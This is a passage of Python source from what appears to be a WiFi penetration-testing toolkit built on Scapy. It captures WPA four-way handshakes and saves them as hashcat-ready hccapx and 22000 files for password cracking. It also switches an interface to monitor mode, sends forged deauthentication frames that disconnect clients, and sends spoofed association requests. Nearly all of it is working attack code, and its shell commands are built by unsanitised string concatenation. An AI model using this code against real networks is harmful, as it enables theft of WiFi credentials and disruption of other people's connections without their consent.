                    packet[Dot11FCS].addr1 != packet[Dot11FCS].addr2 and \
                    packet[Dot11FCS].addr2 == packet[Dot11FCS].addr3:

                eapol: Union[None, Dict[str, Union[int, bytes]]] = self._parse_eapol(packet[EAPOL].original)
                bssid: str = packet[Dot11FCS].addr2
                client: str = packet[Dot11FCS].addr1

                if bssid not in self.wpa_handshakes.keys():
                    self.wpa_handshakes[bssid]: Dict[str, Union[str, Dict[str, Union[int, float, str, bytes]]]] = dict()
                assert client not in self.wpa_handshakes[bssid].keys(), \
                    'First EAPOL message already in the dictionary!'

                self.wpa_handshakes[bssid][client]: Dict[str, Union[int, float, str, bytes]] = dict()

                self.wpa_handshakes[bssid][client]['essid'] = 'Unknown'
                if bssid in self.bssids.keys() and 'essid' in self.bssids[bssid].keys():
                    self.wpa_handshakes[bssid][client]['essid'] = self.bssids[bssid]['essid']

                self.wpa_handshakes[bssid][client]['key version'] = eapol['version']
                self.wpa_handshakes[bssid][client]['anonce'] = eapol['wpa key nonce']
                self.wpa_handshakes[bssid][client]['pcap file']: str = \
                    'wpa' + str(self.wpa_handshakes[bssid][client]['key version']) + \
                    '_' + bssid.replace(':', '') + \
                    '_' + client.replace(':', '') + \
                    '_' + strftime('%Y%m%d_%H%M%S') + '.pcap'
                wrpcap(self.wpa_handshakes[bssid][client]['pcap file'], packet, append=True)
            # endregion

            # region 802.11 EAPOL Message 2 of 4
            if packet.haslayer(EAPOL) and \
                    packet[Dot11FCS].type == 2 and \
                    packet[Dot11FCS].subtype == 8 and \
                    packet[Dot11FCS].SC == 0 and \
                    packet[Dot11FCS].FCfield.value % 2 != 0 and \
                    packet[Dot11FCS].addr1 != packet[Dot11FCS].addr2 and \
                    packet[Dot11FCS].addr1 == packet[Dot11FCS].addr3:

                eapol: Union[None, Dict[str, Union[int, bytes]]] = self._parse_eapol(packet[EAPOL].original)
                bssid: str = packet[Dot11FCS].addr1
                client: str = packet[Dot11FCS].addr2

                assert bssid in self.wpa_handshakes.keys(), \
                    'Not found first EAPOL message'
                assert client in self.wpa_handshakes[bssid].keys(), \
                    'Not found first EAPOL message'
                assert 'eapol' not in self.wpa_handshakes[bssid][client].keys(), \
                    'Authentication session already captured'

                self.wpa_handshakes[bssid][client]['timestamp']: datetime = datetime.utcnow().timestamp()
                self.wpa_handshakes[bssid][client]['snonce'] = eapol['wpa key nonce']
                self.wpa_handshakes[bssid][client]['key mic'] = eapol['wpa key mic']
                self.wpa_handshakes[bssid][client]['eapol'] = \
                    b''.join([packet[EAPOL].original[:81],
                              b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                              pack('!H', eapol['wpa key length']),
                              packet[EAPOL].original[99:]])

                # region Content for hccapx file. Format hccapx is a custom format for hashcat
                hccapx: bytes = b'HCPX'  # Signature
                hccapx += b'\x04\x00\x00\x00'  # Version
                hccapx += b'\x02'  # Message pair
                hccapx += pack('B', len(self.wpa_handshakes[bssid][client]['essid']))  # ESSID length
                hccapx += self.wpa_handshakes[bssid][client]['essid'].encode('utf-8')  # ESSID
                # Reserved 32 bytes for ESSID
                hccapx += b''.join(b'\x00' for _ in range(32 - len(self.wpa_handshakes[bssid][client]['essid'])))
                hccapx += pack('B', self.wpa_handshakes[bssid][client]['key version'])  # Key version
                hccapx += self.wpa_handshakes[bssid][client]['key mic']  # Key mic
                hccapx += self._convert_mac(bssid)  # BSSID
                hccapx += self.wpa_handshakes[bssid][client]['anonce']  # AP Key nonce
                hccapx += self._convert_mac(client)  # Client MAC address
                hccapx += self.wpa_handshakes[bssid][client]['snonce']  # Client Key nonce
                hccapx += pack('H', len(self.wpa_handshakes[bssid][client]['eapol']))  # Eapol length
                hccapx += self.wpa_handshakes[bssid][client]['eapol']
                # Reserved 256 bytes for Client EAPOL key data
                hccapx += b''.join(b'\x00' for _ in range(256 - len(self.wpa_handshakes[bssid][client]['eapol'])))
                self.wpa_handshakes[bssid][client]['hccapx content']: bytes = hccapx
                self.wpa_handshakes[bssid][client]['hccapx file']: str = \
                    'wpa' + str(self.wpa_handshakes[bssid][client]['key version']) + \
                    '_' + bssid.replace(':', '') + \
                    '_' + client.replace(':', '') + \
                    '_' + strftime('%Y%m%d_%H%M%S') + '.hccapx'
                # endregion

                # region Hashcat 22000 format
                hashcat_22000: str = 'WPA*'  # Signature

                # Key version
                hashcat_22000 += \
                    '{0:0=2d}'.format(self.wpa_handshakes[bssid][client]['key version']) + '*'

                # Key mic
                hashcat_22000 += \
                    ''.join('{:02x}'.format(x) for x in self.wpa_handshakes[bssid][client]['key mic']) + '*'

                # BSSID
                hashcat_22000 += bssid.replace(':', '') + '*'

                # Client MAC address
                hashcat_22000 += client.replace(':', '') + '*'

                # ESSID
                hashcat_22000 += \
                    ''.join('{:02x}'.format(ord(x)) for x in self.wpa_handshakes[bssid][client]['essid']) + '*'

                # AP Key nonce
                hashcat_22000 += \
                    ''.join('{:02x}'.format(x) for x in self.wpa_handshakes[bssid][client]['anonce']) + '*'

                # Client EAPOL key data
                hashcat_22000 += \
                    ''.join('{:02x}'.format(x) for x in self.wpa_handshakes[bssid][client]['eapol']) + '*'

                # End of file
                hashcat_22000 += '00\n'

                # Save to wpa_handshakes dictionary
                self.wpa_handshakes[bssid][client]['hashcat 22000 content']: str = hashcat_22000
                self.wpa_handshakes[bssid][client]['hashcat 22000 file']: str = \
                    'wpa' + str(self.wpa_handshakes[bssid][client]['key version']) + \
                    '_' + bssid.replace(':', '') + \
                    '_' + client.replace(':', '') + \
                    '_' + strftime('%Y%m%d_%H%M%S') + '.22000'
                # endregion

                # region Save EAPOL session to hccapx, 22000, pcap files
                with open(self.wpa_handshakes[bssid][client]['hccapx file'], 'wb') as hccapx_file:
                    hccapx_file.write(self.wpa_handshakes[bssid][client]['hccapx content'])
                with open(self.wpa_handshakes[bssid][client]['hashcat 22000 file'], 'w') as hccapx_file:
                    hccapx_file.write(self.wpa_handshakes[bssid][client]['hashcat 22000 content'])
                wrpcap(self.wpa_handshakes[bssid][client]['pcap file'], packet, append=True)
                # endregion

            # endregion

        except AssertionError:
            pass

        except IndexError:
            pass

        except UnicodeDecodeError:
            pass

        except KeyError:
            pass

        except:
            pass

    # endregion

    # region Start sniffer
    def _start_sniffer(self,
                       wireless_interface: Union[None, str] = None,
                       pcap_files_directory: Union[None, str] = None) -> bool:
        # Set wireless interface
        if wireless_interface is None:
            wireless_interface = self._interface

        # Set directory with pcap files
        if pcap_files_directory is None:
            pcap_files_directory = self._pcap_directory

        # Kill sniffer processes
        self._base.kill_process_by_name(process_name='dumpcap')

        # Set path for sniffer
        if self._base.get_platform().startswith('Windows'):
            sniffer_path: str = '"C:\\Program Files\\Wireshark\\dumpcap.exe"'
        else:
            sniffer_path: str = 'dumpcap'

        # Set sniffer command
        sniffer_command: str = \
            sniffer_path + ' -y "IEEE802_11_RADIO" -I -i "' + wireless_interface + \
            '" -b duration:1 -w "' + pcap_files_directory + \
            'sniff.pcap" -f "(wlan type data) or (wlan type mgt subtype beacon)"'

        # Run sniffer process
        if self._base.get_platform().startswith('Windows'):
            Popen(sniffer_command, shell=True, stdout=PIPE, stderr=PIPE)
        else:
            Popen([sniffer_command], shell=True, stdout=PIPE, stderr=PIPE)

        return True
    # endregion

    # region Read pcap files from directory
    def _read_pcap_files(self, pcap_files_directory: Union[None, str] = None) -> None:
        # Set directory with pcap files
        if pcap_files_directory is None:
            pcap_files_directory = self._pcap_directory

        # Clear directory for pcap files
        if not isdir(pcap_files_directory):
            mkdir(pcap_files_directory)
        else:
            rmtree(pcap_files_directory)
            mkdir(pcap_files_directory)

        while True:
            # Make list with pcap files
            pcap_files: List[str] = [path_join(pcap_files_directory, file) for file in listdir(pcap_files_directory)]

            # If length of pcap file more than one
            if len(pcap_files) > 1:

                # Get oldest pcap file
                pcap_file = min(pcap_files, key=getctime)
                clean_pcap_file = path_join(pcap_files_directory, 'clean.pcap')

                # Delete malformed packets
                if self._base.get_platform().startswith('Windows'):
                    tshark_path: str = '"C:\\Program Files\\Wireshark\\tshark.exe"'
                    check_output(tshark_path + ' -r "' + pcap_file + '" -Y "not _ws.malformed" -w "' +
                                 clean_pcap_file + '"')
                else:
                    run(['tshark -r "' + pcap_file + '" -Y "not _ws.malformed" -w "' + clean_pcap_file + '"'],
                        shell=True, stdout=PIPE, stderr=PIPE)

                # Get packets from oldest pcap file
                try:
                    packets = rdpcap(clean_pcap_file)
                except Scapy_Exception:
                    packets = list()
                except FileNotFoundError:
                    packets = list()

                # Delete oldest pcap file
                try:
                    remove(pcap_file)
                    remove(clean_pcap_file)
                except FileNotFoundError:
                    pass

                # Analyze packets
                for packet in packets:
                    try:
                        assert packet.haslayer(RadioTap), 'Is not RadioTap packet!'
                        assert packet.haslayer(Dot11FCS), 'Is not IEEE 802.11 packet!'
                        self._analyze_packet(packet)

                    except IndexError:
                        pass

                    except AssertionError:
                        pass

            # Wait one second
            else:
                sleep(1)
    # endregion

    # region Scan WiFi channels and search AP ssids
    def _scan_ssids(self):
        while True:
            for channel in self.available_wifi_channels:
                if self._set_wifi_channel == -1:
                    self._switch_wifi_channel(channel=int(channel))
                    sleep(5)
                else:
                    sleep(1)
    # endregion

    # endregion

    # region Public methods

    # region Enable monitor mode on interface
    def enable_monitor_mode(self,
                             wireless_interface: Union[None, str] = None) -> bool:
        # Set wireless interface
        if wireless_interface is None:
            wireless_interface = self._interface

        # Mac OS
        if self._base.get_platform().startswith('Darwin'):
            if self.debug_mode:
                self._base.print_info('Disassociate wireless interface: ', str(wireless_interface))
            run([self._airport_path + ' ' + wireless_interface + ' --disassociate'], shell=True)
            return True

        # Linux
        elif self._base.get_platform().startswith('Linux'):
            if self.debug_mode:
                self._base.print_info('Stop service', 'network-manager')
            run(['service network-manager stop'], shell=True, stdout=PIPE, stderr=STDOUT)
            # self._base.kill_process_by_name(process_name='wpa_supplicant')
            if self.debug_mode:
                self._base.print_info('Run command: ', 'airmon-ng check kill')
            run(['airmon-ng check kill'], shell=True, stdout=PIPE, stderr=STDOUT)
            if self.debug_mode:
                self._base.print_info('Get current mode for wireless interface: ', str(wireless_interface))
            interface_mode: CompletedProcess = run(['iwconfig ' + wireless_interface], shell=True, stdout=PIPE)
            interface_mode: str = interface_mode.stdout.decode('utf-8')
            if 'Mode:Monitor' not in interface_mode:
                self._base.print_info('Set monitor mode on wireless interface: ', wireless_interface)
                sleep(0.1)
                run(['ifconfig ' + wireless_interface + ' down'], shell=True, stdout=PIPE)
                sleep(0.1)
                run(['iwconfig ' + wireless_interface + ' mode monitor'], shell=True, stdout=PIPE)
                sleep(0.1)
                run(['ifconfig ' + wireless_interface + ' up'], shell=True, stdout=PIPE)
                sleep(0.1)
                if self.debug_mode:
                    self._base.print_info('Check current mode for wireless interface: ', str(wireless_interface))
                interface_mode: CompletedProcess = run(['iwconfig ' + wireless_interface], shell=True, stdout=PIPE)
                interface_mode: str = interface_mode.stdout.decode('utf-8')
                if 'Mode:Monitor' in interface_mode:
                    return True
                else:
                    return False
            else:
                self._base.print_info('Wireless interface: ', wireless_interface, ' already in mode monitor')
                return True

        # Windows
        elif self._base.get_platform().startswith('Windows'):
            wlanhelper: Popen = \
                Popen('wlanhelper "' + wireless_interface + '" mode', shell=True, stdout=PIPE, stderr=PIPE)
            wlanhelper_output, wlanhelper_error = wlanhelper.communicate()
            assert wlanhelper_error == b'', 'Library Npcap not found. ' \
                                            'Install Npcap: https://nmap.org/npcap/ and ' \
                                            'Nmap: https://nmap.org/download.html'
            if b'monitor' in wlanhelper_output:
                self._base.print_info('Wireless interface: ', wireless_interface, ' already in mode monitor')
                return True
            else:
                wlanhelper: Popen = \
                    Popen('wlanhelper "' + wireless_interface + '" mode monitor', shell=True, stdout=PIPE, stderr=PIPE)
                wlanhelper_output, wlanhelper_error = wlanhelper.communicate()
                if b'Success' in wlanhelper_output:
                    return True
                else:
                    return False

        # Other
        else:
            self._base.print_error('This platform: ', self._base.get_platform(), ' is not supported')
            return False
    # endregion

    # region Validate WiFi channel
    def validate_wifi_channel(self, wifi_channel: int) -> bool:
        try:
            return True if wifi_channel in self.available_wifi_channels else False
        except IndexError:
            return False
    # endregion

    # region Resume scan WiFi channels and search AP ssids
    def resume_scan_ssids(self) -> None:
        self._set_wifi_channel = -1
    # endregion

    # region Set WiFi chanel and prohibit switching between channels
    def set_wifi_channel(self, channel: int = 1) -> None:
        assert self.validate_wifi_channel(wifi_channel=channel), \
            'Bad WiFi channel: ' + self._base.error_text(str(channel))
        self._set_wifi_channel = channel
        self._switch_wifi_channel(channel=channel)
    # endregion

    # region Sending deauth packets
    def send_deauth(self,
                    bssid: str = '01:23:45:67:89:0a',
                    client: str = '01:23:45:67:89:0b',
                    number_of_deauth_packets: Union[None, int] = None,
                    wireless_interface: Union[None, str] = None) -> None:
        """
        Sending 802.11 deauth packets
        :param bssid: BSSID (example: '01:23:45:67:89:0a')
        :param client: A client MAC address for deauth (example: '01:23:45:67:89:0b')
        :param number_of_deauth_packets: The number of deauth packets for one iteration (default: 50)
        :param wireless_interface: Wireless interface name (example: 'wlan0')
        :return: None
        """
        if wireless_interface is None:
            wireless_interface = self._interface

        if number_of_deauth_packets is None:
            number_of_deauth_packets = 50

        client_deauth_packet: bytes = \
            RadioTap() / \
            Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
            Dot11Deauth(reason=7)

        ap_deauth_packet: bytes = \
            RadioTap() / \
            Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=bssid) / \
            Dot11Deauth(reason=7)

        for _ in range(int(number_of_deauth_packets / 2)):
            sendp(client_deauth_packet, iface=wireless_interface, monitor=True, verbose=False)
            sendp(ap_deauth_packet, iface=wireless_interface, monitor=True, verbose=False)

        self.deauth_packets.append({'packets': number_of_deauth_packets,
                                    'bssid': bssid, 'client': client,
                                    'timestamp': datetime.utcnow().timestamp()})
    # endregion

    # region Sending association request packet
    def send_association_request(self,
                                 bssid: str = '01:23:45:67:89:0a',
                                 essid: str = 'AP_NAME',
                                 verbose: bool = True,
                                 number_of_association_packets: Union[None, int] = None,
                                 wireless_interface: Union[None, str] = None) -> None:
        """
        Sending 802.11 Association request
        :param bssid: BSSID (example: '01:23:45:67:89:0a')
        :param essid: ESSID (example: 'AP_NAME')
        :param verbose: Verbose bool (default: True)
        :param number_of_association_packets: The number of association packets for one iteration (default: 1)
        :param wireless_interface: Wireless interface name (example: 'wlan0')
        :return:
        """
        if wireless_interface is None:
            wireless_interface = self._interface

        if number_of_association_packets is None:
            number_of_association_packets = 1

        send_packets: bool = False
        already_send_packets: bool = False

        if verbose:
            send_packets = True
        else:
            for association_index in range(len(self.association_packets) - 1, -1, -1):
                if bssid == self.association_packets[association_index]['bssid']:
                    already_send_packets = True
                    if (datetime.utcnow().timestamp() - self.association_packets[association_index]['timestamp']) > 15:
                        send_packets = True
                    else:
                        break
            if not already_send_packets:
                send_packets = True

        if send_packets:
            client = self._base.get_interface_mac_address(interface_name=wireless_interface)

            auth_request_packet: bytes = \
                RadioTap() / \
                Dot11(addr1=bssid, addr2=client, addr3=bssid, SC=16, ID=0x3a01) / \
                Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)

            assoc_request_packet: bytes = \
                RadioTap() / \
                Dot11(type=0, subtype=0, addr1=bssid, addr2=client, addr3=bssid, SC=16, ID=0x3a01) / \
                Dot11AssoReq(cap=0x1104, listen_interval=0x0003) / \
                Dot11Elt(ID=0, info=essid) / \
                Dot11EltRates(rates=[0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c]) / \
                Dot11EltRSN(akm_suites=AKMSuite(oui=0x000fac, suite=0x02), mfp_capable=1, ptksa_replay_counter=3)

            sendp(auth_request_packet, iface=wireless_interface, monitor=True, verbose=False)
            sleep(0.5)
            for _ in range(number_of_association_packets):
                sendp(assoc_request_packet, iface=wireless_interface, monitor=True, verbose=False)
                sleep(0.1)

            self.association_packets.append({'verbose': verbose, 'bssid': bssid, 'essid': essid,
                                             'client': client, 'timestamp': datetime.utcnow().timestamp()})
    # endregion

    # endregion

# endregion
